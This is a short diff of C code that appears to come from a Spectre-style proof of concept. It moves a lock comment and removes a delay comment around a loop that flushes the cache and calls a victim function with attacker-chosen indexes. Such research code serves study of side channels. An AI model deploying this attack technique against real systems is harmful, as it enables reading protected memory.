@@ -51,13 +51,13 @@ void victim_function(size_t x) {
 }
 
 void readMemoryByte() {
-	// acquire lock
 	static int offset, locked, no_items;
 	static size_t buffer[64], buffer_size = 64;
 
 	// wait for file containing indexes to appear
 	while (access(index_file_name, F_OK) == -1);
 
+	// acquire lock
 	locked = -1;
 	while (locked != 0) {
 		fd_lock = open(lock_file_name, O_CREAT);
@@ -80,7 +80,7 @@ void readMemoryByte() {
 
 	for (int i = 0; i < no_items; ++i) {
 		_mm_clflush(&array1_size);
-		for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
+		for (volatile int z = 0; z < 100; z++) {}
 		victim_function(buffer[i]);
 	}
 
